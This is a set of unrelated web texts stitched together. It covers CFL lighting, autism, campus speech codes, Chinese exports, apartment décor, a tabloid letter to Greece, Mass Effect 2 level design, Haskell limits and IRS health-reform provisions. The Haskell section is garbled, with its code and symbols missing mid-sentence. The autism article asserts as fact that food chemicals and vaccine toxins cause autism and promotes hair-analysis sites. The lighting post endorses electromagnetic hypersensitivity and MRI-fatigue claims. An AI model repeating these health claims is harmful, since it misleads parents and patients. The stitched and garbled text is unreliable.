For now , Zara 's dream , she said , is to walk down the street without people staring at her , to feel young again .
CFL 's can produce light a lot closer to the blue spectrum than any incandescent light can and for less money and they hands down last longer .
Any photographer will tell you that incandescents tend way more to red , ever take a photo indoors with a film camera ( using daylight film ) and get that nasty yellow cast to your photos , that 's because incandescent light is nowhere near daylight temperature .
Today we do n't have that problem because digital cameras automatically white balance for the light in the room .
I agree with you that LED bulbs are da bomb but so far I have yet to see a LED bulb that is on the cheap side that can produce light close to daylight spectrum , I know they exist but they are generally a sort of panel setup not something you plug into your lamp and very very expensive .
So for now , if you need near daylight color light and can't afford a few grand for a professional setup cfl is it .
A friend had an indoor garden using cfl , he had blue for one cycle and red for the other ( grow vs. bloom ) the plants did well without spending three grand for something like a mercury vapor tech bulb which needed an expensive ballast and sucked a lot of power and made a LOT of heat as well .
I think by noise he means the ballast may make " noise " on the circuit which only some very sensitive equipment would be bothered by .
In the old days computer techs would tell people not to plug into a circuit with any device that pulled a lot of amperage when it first started up , that included AC units , compressors ( as in your refrigerator or a shop air compressor ) or vacuum cleaners because that startup usually caused a sort of brown out and then a surge which could damage circuitry and something that created noise in the circuit might affect the shape of the sign wave in the AC current also possibly causing a problem .
Tech has grown past a lot of those issues .
Many years ago I recall watching a PBS science show ( possibly a NOVA ) that investigated how fluorescent bulbs in the workplace could be causing fatigue to people who work under them all day long .
While you cannot consciously see a fluorescent bulb flash ( incandescent is a heated element while fluorescent tech is a gas that gives out light when it is excited by the small amount of power supplied by the ballast thus the flashing ) subconsciously your brain can see the flashing and that could lead to fatigue .
The solution for that issue was a ballast that created a faster update but the bulbs were pretty expensive , I do not know the current state of fluorescent tech as to if the new stuff out right now updates faster than the old ones did .
There is a growing belief that some folks are more sensitive to magnetic fields than others and it could cause health issues .
Remember those stories about farmers with AC transmission lines over their farms who claimed their cows stopped giving milk ?
There have also been some reports that people who live near maglev train tracks complain of constant headaches and depression , our brains are electrical why would it be such a stretch that we could be affected by magnetic fields ?
In Europe there is growing support for an illness called EHS or electromagnetic hypersensitivity syndrome .
People with this issue need to live away from all magnetic fields some are so sensitive that even the alternator in the car causes them discomfort , you may say baloney ... well no one believed that fibromyalgia or chronic fatigue syndrome were real either for quite some time .
Ever have an MRI and wonder why you felt so exhausted afterwards ?
MRI uses one heckuva strong magnetic field to literally change the magnetic field in your body to create the images .
Do n't laugh off the idea that some folks could be adversely affected by magnetic fields there may be something to it but I really doubt a couple of cfl bulbs could be an issue but who knows .
Remember when cell phones came out , some folks said having them so close to your brain might cause brain tumors and the use of a headset was strongly encouraged .
Well somebody also said that when we turned on that new gigantic collider in Europe that we 'd open up pinhole singularities all over the world and end our existence too .
The point is that we do n't know everything .
While it 's been shown that plants have at least a simple nervous system ( nothing like we have ) I 'm sort of doubting any negative effects from a cfl bulb .
Plants like light and proper soil salinity and water salinity , if they do n't get it they do n't grow as well and that 's that .

Toxic Chemicals DO Affect Autism
I am often asked , " Do chemicals in our foods and medications cause autism ?
Will these chemicals ever be taken off the market ? "
My answer ?
" YES !
Toxic chemicals DO affect and CAN cause autism , especially if toxic food chemicals are eaten during pregnancy or given to a child within the first 18 months of its life .
As long as chemical toxins remain in our food supply and in childhood vaccinations , this pandemic is n't going to end . "
Years ago , humans were only concerned about environmental toxins , but today , the focus needs to be on the corporations marketing toxic chemicals in our public food supply and in our medications .
Many of the big corps will continue , sadly , to manufacture toxic products , so it 's up to YOU , the consumer , to stop buying them .
Be aware that over 10,000 chemicals toxic to human health are added to our public food supply .
The dangerous effects of the diet sweeteners , particularly aspartame , are prime examples .
Go to www.SweetPoison.com for the research and information on aspartame 's toxic effects on human health , especially during pregnancy .
Also be aware that advertisers steer consumers toward these chemical products because these toxic food chemicals net mega profits .
Notice how many diet food products are marketed to children .
I wrote an article in September 2006 warning consumers back thenthat advertisers are NOT nutritionists .
Please take this warning to heart , especially if you are pregnant or if you have children .
Err on the side of caution , and avoid ingesting ALL food chemicals during pregnancy ; reject exposing your babies to ALL chemicals during the first 18 months of their lives .
So , how do you know what food chemicals you are exposed to or what toxins your child is exposed to ?
Take it upon yourself to find the answers that few corporations provide you ; research all the food chemicals and environmental chemicals you think you are exposed to , and seriously consider having a hair analysis done before pregnancy and on your children .
Go to www.HairAnalysisProgram.com to get some answers : about why your child is suffering so , to learn what toxins are inside of your baby , and to learn what toxins may have been inside of you during pregnancy .
Discover what toxins you need to avoid right now ; now and forever .
When your child is suffering from autism , never stop searching for the answers why this has happened , and find the tools you need to make this situation better .
Waiting for the " powers - that - be " to uncover the answers for you is wasting precious time .
Implement , for yourself , the action needed now , and learn how to avoid future health issues caused by the chemical toxins to which you are not even aware you or your child are exposed .
Toxic chemicals in our environment , chemicals in our medications , and toxins in our food supply are all at the root of autism .
Only YOU can implement the solutions ; ― find the answers you have been seeking , and never stop searching .

The Unexplainable
A weird gallery of those kinds of pics that simply can't fail but make you utterly baffled .
It 's pretty safe to say that there are some truly strange people out there doing some crazy things .
You probably live near some of them ?
7,113
In 2007 a student working his way through college was found guilty of racial harassment for reading a book in public .
Some of his co-workers had been offended by the book 's cover , which included pictures of men in white robes and peaked hoods along with the tome 's title , Notre Dame vs. the Klan .
The student desperately explained that it was an ordinary history book , not a racist tract , and that it in fact celebrated the defeat of the Klan in a 1924 street fight .
Nonetheless , the school , without even bothering to hold a hearing , found the student guilty of " openly reading [ a ] book related to a historically and racially abhorrent subject . "
The incident would seem far - fetched in a Philip Roth novel — or a Philip K . Dick novel , for that matter — but it actually happened to Keith John Sampson , a student and janitor at Indiana University –Purdue University Indiana - polis .
Despite the intervention of both the American Civil Liberties Union and the Foundation for Individual Rights in Education ( FIRE , where I am president ) , the case was hardly a blip on the media radar for at least half a year after it took place .
Compare that lack of attention with the response to the now - legendary 1993 " water buffalo incident " at the University of Pennsylvania , where a student was brought up on charges of racial harassment for yelling " Shut up , you water buffalo ! " out his window .
His outburst was directed at members of a black sorority who were holding a loud celebration outside his dorm .
Penn 's effort to punish the student was covered by Time , Newsweek , The Village Voice , Rolling Stone , The New York Times , The Financial Times , The New Republic , NPR , and NBC Nightly News , for starters .
Commentators from Garry Trudeau to Rush Limbaugh agreed that Penn 's actions warranted mockery .
Hating campus political correctness was hotter than grunge rock in the early 1990s .
Both the Democratic president and the Republican Congress condemned campus speech codes .
California passed a law to invalidate Stanford 's onerous speech rules , and comedians and public intellectuals alike decried collegiate censorship .
So what happened ?
Why does a case like the one involving Sampson 's Klan book , which is even crazier than the " water buffalo " story that was an international scandal 15 years ago , now barely produce a national shrug ?
For many , the topic of political correctness feels oddly dated , like a debate over the best Nirvana album .
There is a popular perception that P.C. was a battle fought and won in the 1990s .
Campus P.C. was a hot new thing in the late 1980s and early '90s , but by now the media have come to accept it as a more or less harmless , if unfortunate , byproduct of higher education .
But it is not harmless .
With so many examples of censorship and administrative bullying , a generation of students is getting four years of dangerously wrongheaded lessons about both their own rights and the importance of respecting the rights of others .
Diligently applying the lessons they are taught , students are increasingly turning on each other , and trying to silence fellow students who offend them .
With schools bulldozing free speech in brazen defiance of legal precedent , and with authoritarian restrictions surrounding students from kindergarten through graduate school , how can we expect them to learn anything else ?
Throwing the Book at Speech Codes
One reason people assume political correctness is dead is that campus speech codes — perhaps the most reviled symbol of P.C. — were soundly defeated in every single legal challenge brought against them from 1989 to 1995 .
At two universities in Michigan , at the University of Wisconsin and the University of Connecticut , at Stanford , speech codes crumbled in court .
And of the 13 legal challenges launched since 2003 against codes that FIRE has deemed unconstitutional , each and every one has been successful .
Given the vast differences across judges and jurisdictions , a 13 - 0 winning streak is , to say the least , an accomplishment .
Yet FIRE has determined that 71 percent of the 375 top colleges still have policies that severely restrict speech .
And the problem is n't limited to campuses that are constitutionally bound to respect free expression .
The overwhelming majority of universities , public and private , promise incoming students and professors academic freedom and free speech .
When such schools turn around and attempt to limit those students ' and instructors ' speech , they reveal themselves as hypocrites , susceptible not only to rightful public ridicule but also to lawsuits based on their violations of contractual promises .
FIRE defines a speech code as any campus regulation that punishes , forbids , heavily regulates , or restricts a substantial amount of protected speech , or what would be protected speech in society at large .
Some of the codes currently in force include " free speech zones . "
The policy at the University of Cincinnati , for example , limits protests to one area of campus , requires advance scheduling even within that area , and threatens criminal trespassing charges for anyone who violates the policy .
Other codes promise a pain - free world , such as Texas Southern University 's ban on attempting to cause " emotional , " " mental , " or " verbal harm , " which includes " embarrassing , degrading or damaging information , assumptions , implications , [ and ] remarks " ( emphasis added ) .
The code at Texas A&M prohibits violating others ' " rights " to " respect for personal feelings " and " freedom from indignity of any type . "
Many universities also have wildly overbroad policies on computer use .
Fordham , for example , prohibits using any email message to " insult " or " embarrass , " while Northeastern University tells students they may not send any message that " in the sole judgment of the University " is " annoying " or " offensive . "
Vague racial and sexual harassment codes remain the most common kinds of campus speech restrictions .
Murray State University , for example , bans " displaying sexual and / or derogatory comments about men / women on coffee mugs , hats , clothing , etc . "
( What is it like to be sexually harassed by a coffee mug ? )
The University of Idaho bans " communication " that is " insensitive . "
New York University prohibits " insulting , teasing , mocking , degrading , or ridiculing another person or group , " as well as " inappropriate … comments , questions , [ and ] jokes . "
Davidson College 's sexual harassment policy still prohibits the use of " patronizing remarks , " including referring to an adult as " girl , " " boy , " " hunk , " " doll , " " honey , " or " sweetie . "
It also bars " comments or inquiries about dating . "
Before it was changed under pressure from FIRE , the residence life program at the University of Delaware , which applied to all 7,000 students in the dormitories , included a code that described " oppressive " speech as a crime on the same level of urgency as rape .
Not content to limit speech , the program also informed resident assistants that " all whites are racists " and that it was the university 's job to heal them , required students to participate in floor events that publically shamed participants with " incorrect " political beliefs , and forced students to fill out questionnaires about what races and sexes they would date , with the goal of changing their idea of their own sexual identity .
( These activities were described in the university 's materials as " treatments . " )
These were just the lowlights among a dozen other illegal invasions of privacy , free speech , and conscience .
Until 2007 Western Michigan University 's harassment policy banned " sexism , " which it defined as " the perception and treatment of any person , not as an individual , but as a member of a category based on sex . "
I am unfamiliar with any other attempt by a public institution to ban a perception , let alone perceiving that a person is a man or woman .
Even public restrooms violate this rule , which may help explain why the university finally abandoned it .
Needless to say , ridiculous codes produce ridiculous prosecutions .
In 2007 , at Brandeis University , the administration found politics professor Donald Hindley guilty of racial harassment for using the word wetback in his Latin American politics class .
Why had Hindley employed such an epithet ?
To explain its origins and to decry its use .
Even if it were true , as defensive administrators often claim , that these policies are rarely enforced , their omnipresence would still pose a serious problem on its own .
These codes not only chill free expression by warning students of serious consequences for controversial speech — or even normal , everyday speech — but they also systematically miseducate kids to believe that free speech goes only as far as the most sensitive person in the room can handle .
Free Inquiry , but Not Too Free
College students are placed in an unenviable position .
They are constantly urged to argue , debate , discuss , question , and analyze the most important issues of the day , but they also often know stories of other students who were punished for taking the " wrong side " of an argument .
Consider the recent trend of colleges cracking down on students for advocating , or in some cases just joking about , gun rights .
In April a student at the Community College of Allegheny County , in Pittsburgh , was prohibited from handing out pamphlets encouraging students to join Students for Concealed Carry on Campus , a national organization .
The administration accused her of punishable " solicitation " for trying to " sell " students on her ideas and even insisted that she destroy her pamphlets .
In fall 2008 , a professor at Central Connecticut State University called the police on students who gave a presentation in his speech class arguing for the safety value of concealed carry .
Also in 2008 , at Lone Star College–Tomball near Houston , a student group was threatened with dissolution for distributing a satiric flier listing " Top Ten Gun Safety Tips . "
The banned flier listed " advice " such as : " No matter how excited you are about buying your first gun , do not run around yelling ' I have a gun !
I have a gun ! ' ? "
That same year , students at another Texas school , Tarrant County College , were told that they had to go to the school 's tiny " free speech zone " if they wanted to demonstrate in favor of concealed carry — and that they could not conduct a symbolic " empty holster protest " even within the confines of the zone .
After the Virginia Tech massacre in 2007 , a student at Hamline University in Saint Paul , Minnesota , was suspended after he sent an email message suggesting that the carnage might have been stopped earlier if students had been armed , a professor at Boston 's Emmanuel College was fired after leading a classroom discussion about the shooting in which he and a student exchanged pretend gunshots , and Yale briefly banned the use of any realistic - looking weapons in theatrical productions , whether switchblades , rapiers , or six - guns .
( Yale now allows such prop weapons , provided that the audience is warned about them in advance . )
In a similar spirit , Arkansas Tech banned Stephen Sondheim 's fanciful musical Assassins in 2008 " out of respect for the families of those victims of the tragedies at Northern Illinois University and Virginia Tech , and from an abundance of caution . "
And in spring 2008 , students at Colorado College were found guilty of " violence " for producing a parody of a feminist flier .
The offending document focused on macho topics such as " chainsaw etiquette , " " tough guy wisdom , " and the range of a sniper rifle .
The administration seemed especially offended by the rifle , with the vice president of student life citing " the juxtaposition of weaponry and sexuality " as a primary reason justifying the finding .
Beyond Left and Right
Because America 's universities tend to tilt left , and because many targets of P.C. censorship are socially conservative , campus censorship has too often come to be understood as a niche issue for the conservative media and blogosphere .
This is a bizarre development , not only because free speech was once a central liberal cause but because liberals are by no means immune from campus censorship .
Hindley , the Brandeis professor who was punished for his instructional use of wetback , is a liberal .
Sampson , the student who read a book about the Klan , is an Obama voter , and some of the most vocal students opposing the Delaware residence program were liberals .
This strange pigeonholing may explain why cases like that of Elizabeth Ito , who lost her job at Forsyth Technical Community College in North Carolina after criticizing the war in Iraq , or the students at the University of Texas who last year were threatened with expulsion for having an Obama poster in their window , struggled to find a receptive audience in the media .
The perception that free speech on campus is primarily a conservative issue ultimately enables campus censors .
Free speech zones , for example , are often tiny , out - of - the - way areas where some campuses quarantine protest activities .
Obtaining permission to use even these limited spaces often involves waiting periods and registration requirements .
In my experience the zones disproportionately affect left - wing protests .
In November , for example , three professors were banned from campus at Southwestern College in California after they supported students whose protest against budget cuts took place outside — I am not making this up — the " free speech patio . "
Nevertheless , the conservative website CampusReform.org has listed a free speech zone as a " leftist " campus abuse .
While the site commendably wants to bring attention to these speech cages , such labeling helps campus bureaucrats brush off criticism as the hobbyhorse of a disfavored political minority , rather than an expression of concern over policies that affect all students .
The reason for P.C. censorship often has nothing to do with left or right .
Sensitivity is often a cynical excuse to squelch speech that administrators do n't like for purely self - interested reasons .
In late 2002 , for example , the administration at Harvard Business School threatened a student newspaper editor because he ran a cartoon mocking the I.T. department for the failure of its computer system during interview week .
The dean claimed the cartoon violated " community standards " because it was not " respectful discourse , " but ultimately the rationale was one that FIRE frequently sees from campus administrators : I believe in free speech and all , but I draw the line at making fun of me .
Hayden Barnes was expelled from Valdosta State University in Georgia in 2007 for posting a collage on Facebook that critiqued a planned parking garage because of its effect on the environment .
The school 's rationale ?
Barnes , a decorated paramedic , posed a " clear and present danger " because the collage was labeled the " Zaccari Memorial Parking Garage . "
Ronald Zaccari was the president of the college ; the collage 's title was a joking reference to the president 's assertion that the garage would be part of his " legacy . "
The school clearly did not seriously believe that Barnes was the next Virginia Tech gunman , as the expulsion note was simply slipped under his door along with a copy of the collage .
Unlearning Liberty
With all these examples of authoritarian bullying and systemic miseducation about rights , we should n't be surprised to discover that students are learning not only to accept censorship but to censor each other .
Just before I completed this article , more than 10,000 copies of the official student newspaper for the University of Arizona were stolen and dumped by students who were upset about an article .
Newspaper theft is common on college campuses , with the most chilling examples culminating in public burnings .
Students have burned other students ' newspapers at schools as prestigious as Cornell , Boston College , Dartmouth , and the University of Wisconsin .
In 2008 multiple incidents were reported in which students destroyed pro-life students ' protest displays , including an incident at Missouri State University in which students smashed dozens of Popsicle - stick crosses and another at the University of Wisconsin - Stevens Point in which a member of the student government tore up the crosses one by one in broad daylight .
His defense : " Since [ abortion ] is a right , you do n't have the right to challenge it . "
When students come to believe that censoring rival points of view is not only permissible but laudable , the potential damage goes far beyond campus .
Our colleges and universities produce our scientists , our business leaders , our lawyers , and our legislators .
The habits formed in college inevitably seep into the other major social institutions .
In 1957 the U.S. Supreme Court said of the nation 's colleges , " Teachers and students must always remain free to inquire , to study and to evaluate , to gain new maturity and understanding ; otherwise our civilization will stagnate and die . "
The Court was right .
The next generation needs to learn the practices of a free people .
If it does n't , we should n't be surprised if , when it takes its turn to run our republic , values such as free speech and tolerance are treated like rusty , battered antiques : quaint , mysterious , and best kept in the basement .

China is accused of keeping the yuan artificially low to help exporters China 's exports jumped by 46 % in February compared with a year ago , raising hopes of a strong recovery in global trade .
The increase was higher than analysts ' expectations of a rise of between 35 % and 40 % .
It is likely to increase pressure on the Chinese government to raise the value of the yuan , which the US in particular complains is undervalued .
China 's imports also rose strongly , increasing by 44.7 % last month .
The recovery seems to have gained legs and this will give China 's government more confidence to start revaluing the yuan
Ren Xianfang , IHS Global Insight
The big growth in imports was helped by the government 's economic stimulus spending .
The rise in imports reduced China 's trade surplus to a one - year low of $ 7.6bn ( £ 5 bn ) for February .
Yuan to rise ?
Beijing had kept the yuan at the same level against the US dollar for 18 months , to help its exporters .
This has angered the US , which says the Chinese government keeps the yuan unfairly undervalued , and Washington continues to call on Beijing to allow the currency to float freely to reflect its true market value .
" The recovery seems to have gained legs and this will give China 's government more confidence to start revaluing the yuan , " said Ren Xianfang , an economist at IHS Global Insight in Beijing .
However , China 's central bank governor , Zhou Xiaochuan , said at the weekend that the government was " very cautious " about easing exchange rate controls because the global economic outlook was still uncertain .
' Pretty impressive ' Analysts said that while the 46 % growth in exports in February was obviously very strong , it was inflated by the comparison with February 2009 , when shipments fell by 25.7 % .
However , last month 's big rise in exports came despite factories across the country being closed for up to five days over the Chinese New Year .
Last year the New Year festival fell in January .
" There were five fewer [ business ] days in February this year than last year , which makes [ the export ] number pretty impressive , " said Royal Bank of Canada senior strategist Brian Jackson .

In retrospect , it seems like destiny .
“ We were meant to be here , ” says Cole Nahal about the Broome Street apartment he shares with Garrett Bowser .
“ About a month before we found it , I took a picture of Garrett in front of the Houston Street Keith Haring memorial mural . ”
Destiny because a few weeks later , the artists / designers were signing a lease on a slightly dingy two - bedroom walk - up they ’d found on Craigslist , which turned out to be Haring ’s former apartment .
“ I liked the space , ” says Nahal .
“ It felt sort of cavernous .
And it ’s a nice neighborhood . ”
They barely clocked the exuberant eighties graffiti - style drawings covering the front door until the landlord told them those radiant babies were genuine works by the most iconic of eighties New York artists .
Before they moved in , admits Nahal , “ we were n’t terribly interested in him . ”
But once there , “ I think we started channeling or something , ” Nahal says .
Haring became the guiding décor spirit , animating choices like the Pop - colored furniture , the DIY masking - tape wall — and , of course , the “ barking dogs ” decals Nahal and Bowser got from Blik .
Recurring Motifs
Nahal , left , and Bowser ( with their dogs , Sir Pudge and Harley Michael Davidson ) use bamboo as a recurring motif in their work ; here , it ’s their equivalent of Haring ’s own repeating designs .
Those Are n’t Original
The most explicit Haring references in the apartment are the Blik “ barking dogs ” and “ dancers ” decals over the black - and - white Barbara Hulanicki wallpaper .
The Facing Wall
“ Our style is industrial but also colorful , and so was his , ” says Nahal .
The painting above is by Huggins .
The mini sculptures are “ bullet - chip cookies , ” by Michael Yinger .

Striping the Walls
Haring embraced cheap , cheerful materials , something Nahal thought about when striping the walls in hot - pink and yellow gaffer ’s tape .
The Pop - influenced drawers , reminiscent of Haring ’s toothy smiling cartoons , came from Pylones ; the blue chair is from Soho Treasures .

Customizing the Appliances
“ We ’ve been painting fridges for a few years , ” Nahal says .
“ Keith Haring used to do that too . ”

Playing With the Space
Haring ’s irreverence helped push Nahal and Bowser toward unorthodox choices ; here , when the roommates realized they could n’t break through the wall to join the two rooms , they installed a piece by Carlton Scott Sturgill ( intricate flowers on wire , made from Ralph Lauren shirt fabric ) that looks as if it pierces the structure .
A Wallpaper Pastiche
Nahal and Bowser made the mural in the living room from multiple wallpapers found at London ’s Habitat , and more Blik decals .
The city / industrial “ one way ” sign chair by Brooklyn artist Michael Whitney summons Haring ’s street - art spirit .

After yesterday 's call by two German politicians that Greece sell off islands , historic buildings and artworks before receiving aid , the German tabloid Bild has written an open letter to the Greek prime minister George Papandreou :
Dear prime minister ,
If you 're reading this , you 've entered a country different from yours .
You 're in Germany .
Here , people work until they are 67 and there is no 14th - month salary for civil servants .
Here , nobody needs to pay a € 1,000 bribe to get a hospital bed in time .
Our petrol stations have cash registers , taxi drivers give receipts and farmers do n't swindle EU subsidies with millions of non-existent olive trees .
Germany also has high debts but we can settle them .
That 's because we get up early and work all day .
We want to be friends with the Greeks .
That 's why since joining the euro , Germany has given your country € 50bn .
At 4:00 pm on the friday of GDC , I attended The Iterative Level Design Process of Bioware ’s Mass Effect 2 .
I went because I loved Mass Effect and because I ’m always happy to see the word “ iterative ” used , but the talk turned out to be an excellent final experience from the conference for a completely unexpected reason : it was all about how they were in the middle of an apparently quite successful lean transition !
Mass Effect was a fabulous game , but it had problems .
Elevators are one example ; also , the world where you found Liara was once intended to be the same length as the other key worlds , but they ran into late issues that they could n’t solve in time .
There was costly , unplanned rework ; insufficient cross - department communication ; and performance issues that they could n’t iron out in the final product .
One factor contributing to several of the problems was that levels were rarely playable : this made it difficult to evaluate the game and its mechanics , it made QA testing quite difficult , it lead to late revision instead of early revision .
So they wanted to do better in Mass Effect 2 .
To fix these problems , they broke down the work on each level in the sequel into six phases ; each phase was designed to answer a specific question , you were supposed to avoid any work that did n’t bear on that question , and the end result of each phase was a deliverable that bears specifically on that question .
In addition , they had three ground rules : they game should always be playable , the current stage should always be a foundation for future work , and the game should always have acceptable performance .
The stages :
Stage 0 : Narrative Overview .
This stage is answering the question “ What is the story ? ” , and the deliverable is a document describing the narrative , the characters , the 2D layout , the art themes , and the cutscenes .
This stage is different from the others ( hence the numbering ) in that it largely involves the writers rather than the full team and in that there ’s nothing playable at the end of it .

Stage 1 : Narrative Playable .
The question : “ Is the pacing and spacing good ? ” ; the deliverable is the first playable .
At this stage , the level only contains its box - level geometry , placeholder set pieces , and “ box level ” dialogs ( i.e. saying “ X will tell Y to do A , B , C ” rather than the actual words that X will use ) ; there are pop -up cutscenes , and prototype level mechanics .
But it ’s still enough to get a feel for what ’s going on , and an awful lot gets changed at this stage .
In fact , this can even be enough to get a global overview rather than a local overview : over Christmas , team members took the game home , even though many of the levels were at stage 1 , and discovered that , while the endgame felt fine in isolation , it did n’t work well in the context of the whole story .
Which led to significant rethinking , but it ’s much less costly to do that rethinking at this stage than later on , or to not do that rethinking at all .

Stage 2 : White Box .
The question : “ Can you see the fun ? ” ; the deliverable is a level with representatitive collision .
You have first - past modeling on the geometry , and a first pass at the dialog .
There ’s basic placement of cover for the combat scenes , and animatronic cutscenes .
And there ’s placeholder music : without that , levels felt blah , leading to criticisms that , in retrospect , were n’t well - founded .

The textures are n’t all there , yet , but it ’s working ; the dialogs are ready for voice acting and are cinematically blocked out ; there ’s full cover placement for combat ; and they ’ve done the basic motion capture for the cut scenes .

Stage 4 : Hardening .
The question : “ Could this be shipped ? ” : they ’d rather not ship the level like that , but if the rest of the game was polished and a deadline was coming up , they could ship the game with a level in this stage .
The deliverable is a “ finished level ” : the level art is textured and lit , the voice - over dialogue has been recorded , and unfortunately I did n’t managed to take notes about what the other aspects of the level should look like .
But you get the idea , I hope .

Stage 5 : Finishing .
The question : “ Can you feel the awesome ? ” ; the deliverable is the final shipping level .
After this , they talked more about some of the lean principles .
They avoid muda ( waste ) by only doing work that they ’re willing to iterate upon .
They avoid muri ( overburdening ) by time - boxing and load balancing .
( But they do n’t load balance across teams . )
They avoid mura ( variation ) by having established deliverables at each phase .
They do kaizen ( continuous improvement ) with level reviews at each phase , with peer reviews ( once per level , at the phase in which that department ’s work should be final ) , and they have level design mindshare meetings weekly .
In general , they use a scrum - like process , but not completely ; in particular , the individual components ( art , cutscenes , modeling , etc. ) did n’t always proceed in lock - step , so they felt that sticking too rigorously to sprint goals slowed them down .
This is one difference from a pure software development context : in software development , it ’s frequently reasonable to have enough cross-training that everybody can swarm on unfinished tasks , whereas a writer is unlikely to be able to help with cinematic rendering .
They do have final reviews by the product owner , preceded by at - desk previews ; this is a creative signoff , and makes sure that the next steps are clear .
What worked :
Pairing level art with level design .
Colocated teams .
Time boxing .
Going deep with some levels : rather than doing stage 1 on all levels before going to stage 2 on any , they finished a few levels much earlier than others .
Among other things , this helped make sure that the process worked , and improved the quality of their estimates .
Testing out the combat systems in game .
Evaluating levels in sections , as necessary .
Being agile with their Agile process .
Stopping to assess the big picture .
Having different goals in different phases .
For example , each stage ’s question let QA know what bugs can be legitimately filed at a given stage ; incidentally , one of the stage exit criteria is that they can’t have any bugs at major severity or higher .
What did n’t work :
Sometimes , they skipped a step ; it came back to bite them .
Not every level can be a “ special snowflake ” .
Level teams that got too big .
Creatures need to be “ representative ” early : it ’s hard to build a space around a creature if you do n’t know what it looks like , how it will fight , how big it is .
That ’s my notes from the presentation .
What I found most exciting about the talk ( other than its heavy lean focus ) was the intelligent questions that they used to differentiate stages .
In a lot of the agile software literature , you ’re told that you not only can but should ship your software frequently ( weekly , daily , hourly ) , leading to a feeling that there ’s a lack of texture in the development process .
But that simply wo n’t work for a long narrative project like this .
You can imagine breaking the game up into smaller episodes ( c.f. their point about going deep on some levels ) , but nothing that gets you close to a weekly ship cycle .
And I think it ’s not a coincidence that they went beyond agile to lean in their inspirations : Toyota also has people working on a project with significantly different skills ( somebody designing the shape of the body of a car wo n’t be able to contribute meaningfully to refining the engine ) , and Toyota is unlikely to have a genuinely shippable car at many of the stages in their design process .
So what they did was keep the core of that “ constantly shippable ” idea ( indeed , they heartily embraced the core , getting huge amounts of mileage out of it ) , in that the game was always playable and performant ; but they explicitly iterated up to a releasable version instead of pretending that the game could always be releasable .
And they turned this into a further strength by combining it with the notion of mura : the focused questions for the stages of the iteration turned into a very powerful tool for the elimination of waste .
Of course , their questions , while applicable to many projects , wo n’t be applicable to all situations .
In particular , this game is a sequel , which reduces the scope of the experiments that you ’ll want to perform .
And they were very up - front about this : when asked if this process would have worked on the original Mass Effect , they answered that yes , they felt that the process would have worked , but the questions would be different .
Which raises the issue of how you come up with the questions that will fit your situation ?
Further combining my obsessions , I ’m wondering if Christopher Alexander ’s The Nature of Order might give us some ideas .
The second volume is all about growing your structures by amplifying centers , which seems to me to be quite consistent with this sort of phased process ; I ’ve just started reading the third volume , and I ’m cautiously optimistic that some of the worked out examples there of how designs got fleshed out might give some insight into how to structure the specifics of this sort of iteration , how to give up on the notion of a product being always releasable without slipping back into Big Design Up Front .
That last paragraph is probably pretty unlikely ; I really do n’t have enough of a feel for how , or even if , Alexander ’s techniques work in practice to know if they can be turned into concrete guidance like this .
Something to dream about , though ; certainly this talk was a fascinating talk and a wonderful end to the conference .

Limit
When I wrote about memoizing polymorphic types I mentioned that you can think ofas the product over all typesof , whereis some type level function .
For examplemight be a type constructor like .
That 's not completely accurate , as I hope to now explain .
Along the way we should get some insight into the meaning of the limit of a functor in a category .
Suppose we have two types , and .
We can form their product .
We have the two projectionsandand if we have an elementinwe know that there is no necessary relationship betweenand .
We can freely chooseso that each ofandcan take on any values we like inandBut now consider an element of .
For each concrete typewe have a projection π.
So it looks like a product of all types .
However , we can't freely choose elements ofso as to get any element ofwe like for each choice of .
To demonstrate this , consider an elementof the type .
For any choice ofwe get a projection .
For example , pickingto beorgives :
We can draw a simple category diagram representing this :
However , comes with a free theorem .
For this particular type we have a free theorem that says that for any .
For example consider the well known function .
The free theorem tells us that this diagram commutes : So ifthen .
We have lost free choice .
But we have lost a lot more freedom than this .
We have a commuting triangle like this for absolutely any function .
It should be clear that there is no way we can pick elements of our list to satisfy all of these constraints .
Somust be the empty list .
This scenario of having one projection for each type has a name .
It 's an example of a cone .
Let 's borrow the definition from Wikipedia : Let F:J→C be a functor .
Let N be an object of C. A cone from N to F is a family of morphisms with one morphism for each X , so that for every morphism f:X→Y , the following diagram commutes :
For any Haskell functor , the free theorem tells us that we have exactly these diagrams withplaying the role of N .
So , with its projections to F ( X ) , forms a cone .
Ifis an instance of the Haskelltype class , ie .
an endofunctor on Hask , then the typegives us a cone .
But not just any old cone .
I do n't know how to prove this but I 'm pretty sure it 's true that the free theorems for a functor are the only non-trivial relations betweenandthat we 're forced to obey .
If that 's true , then , in a sense , is the " biggest " type satisfying the free theorems .
We can make this more precise by saying that for any cone N with associated projections π , we can can map it uniquely toso that the following diagram commutes :
This special kind of cone has a name .
It 's called a limit .
In other words , ∀a. F( a ) = lim F .
In fact , this is exactly howis defined in category - extras
In a sense you can think of a limit of a functor in any category as being like a product for which a version of the free theorems for a functor holds .
A dual story can be told for existential types and colimits .
But to do this we need free theorems for existential types .
I 'll leave that until I 've figured out a nice way to derive these free theorems ... I should have written this article before I wrote one on coends .
Think of it as a prequel .
The fact that we do n't have complete freedom of choice when defining polymorphic elements in Haskell is what we mean by ' parametric ' polymorphism .
Instead of specifying one individual value for each type we define the elements in a uniform way .
In a language like C++ we can use template specialisation to freely construct a rule for getting a value from a type using ' ad hoc ' polymorphism .
That freedom comes at a price - it becomes harder to reason about polymorphism .
It 's amazing that many definitions in category theory emerge naturally ( pun fully intended ) from the free theorems .
I keep hoping that one day I 'll find a paper on exactly what is going on here that I understand .
The original free theorems paper is very uncategorical in its language .
House Ways and Means Republicans on Thursday assailed a provision in the proposed health care reform bill under consideration this week .
Subcommittee on Oversight ranking member Charles Boustany ( R - La. ) said the IRS provision in the bill " dangerously expands , in an ominous way the tentacles of the IRS and it's reach into every American family , " he said today during a press conference .
Republicans estimate the IRS will need nearly 17,000 new employees to meet its new responsibilities under health reform .
" This is a vast expanse of power , " he said .
Boustany said the bill would allow the IRS to confiscate refunds if there are penalties for not buying health care .
Lawmakers have questioned whether the IRS can handle the increased workload to oversee , administer and collect penalties for people who do n't buy health insurance .
" This is increasing tax liability and tax scrutiny , " said Rep. Peter Roskam ( R - Ill . ) .
Ranking member Dave Camp ( R - Mich . ) said many Americans have already rejected the call for health care reform for other reasons and an expansion of the IRS should only add to call to " kill the bill . "
Taxpayers could be required to buy insurance under President Barack Obama ’s reform proposal by 2014 or face penalties of roughly $ 325 per individual that the IRS would collect .
Assuming it becomes law , the Congressional Budget Office expects the IRS will need roughly $ 10 billion over the next 10 years .
" We 're going to fight to the end to see that this does not pass , " Boustany said .
